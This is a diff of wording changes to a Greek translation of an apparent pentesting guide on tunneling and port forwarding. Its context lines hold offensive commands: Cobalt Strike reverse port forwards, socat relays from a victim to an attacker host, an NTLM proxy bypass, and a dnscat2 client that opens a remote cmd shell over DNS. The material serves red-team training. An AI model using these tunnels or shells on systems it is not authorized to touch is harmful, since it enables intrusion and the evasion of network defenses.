@@ -167,14 +167,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-* Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **δημιουργεί σήραγγες κυκλοφορίας προς τον Team Server, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
-* Η κυκλοφορία είναι **συρραμμένη μέσα στην κυκλοφορία C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
+* Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
+* Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
 * **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
 ### rPort2Port local
 
 {% hint style="warning" %}
-Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον υπολογιστή beacon**, όχι στον Team Server και η **κυκλοφορία αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Team Server) και από εκεί στον καθορισμένο host:port
+Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον υπολογιστή beacon**, όχι στον Server Ομάδας και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Server Ομάδας) και από εκεί στον καθορισμένο host:port
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -235,7 +235,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Σύνδεση και Ακρόαση του Πράκτορα
+### Σύνδεση και Ακρόαση Πράκτορα
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -322,7 +322,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου.
+Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου υπολογιστή
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -376,7 +376,7 @@ netstat -antb | findstr 1080
 ```
 Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του πόρου.**
 
-## Προξενίστε εφαρμογές Windows GUI
+## Προξενήστε εφαρμογές Windows GUI
 
 Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
 Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τον πόρο του διακομιστή SOCKS.\
@@ -385,7 +385,7 @@ netstat -antb | findstr 1080
 ## Παράκαμψη proxy NTLM
 
 Το εργαλείο που αναφέρθηκε προηγουμένως: **Rpivot**\
-**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης:
+**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης.
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -402,8 +402,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Τώρα, αν ρυθμίσετε για παράδειγμα στον θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας του επιτιθέμενου 2222.\
-Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.
+Τώρα, αν ρυθμίσετε για παράδειγμα στον θύμα την υπηρεσία **SSH** να ακούει στην θύρα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας του επιτιθέμενου 2222.\
+Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην θύρα 2222.
 
 ## YARP
 
@@ -445,7 +445,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Προώθηση θύρας με dnscat**
+#### **Προώθηση θυρών με dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
